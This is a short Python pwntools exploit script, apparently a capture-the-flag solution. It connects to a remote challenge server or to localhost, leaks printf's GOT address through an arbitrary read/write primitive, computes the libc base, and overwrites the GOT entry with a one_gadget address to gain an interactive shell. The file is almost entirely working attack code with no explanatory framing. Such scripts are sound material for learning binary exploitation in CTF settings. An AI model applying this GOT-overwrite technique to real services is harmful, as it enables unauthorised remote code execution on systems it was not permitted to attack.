from pwn import *
import sys
context.arch = 'amd64'

print sys.argv
if len(sys.argv) == 2 and sys.argv[1] == 'remote':
    r = remote('35.194.194.168',6666)
else:
    r = remote('localhost',8888)

#hijack puts got with main+61
puts_got = 0x600ba0
main_61 = 0x4006d3
def write_addr(data):
    r.recvuntil('Where u want to write :')
    r.sendline(str(data))
    r.recvuntil('=')
    reply = r.recvline().strip()
    value = int(reply, 16)
    return value
def write_value(data):
    r.recvuntil('What value u want to write')
    r.sendline(str(data))



puts_got = 0x600ba0
main_61 = 0x4006d3
printf_got = 0x600bb8
one_gadget = 0x45216
#write_addr(puts_got)
#write_value(main_61)
printf_addr = write_addr(printf_got)
libc = printf_addr - 0x55800
write_value(libc + one_gadget)
r.interactive()
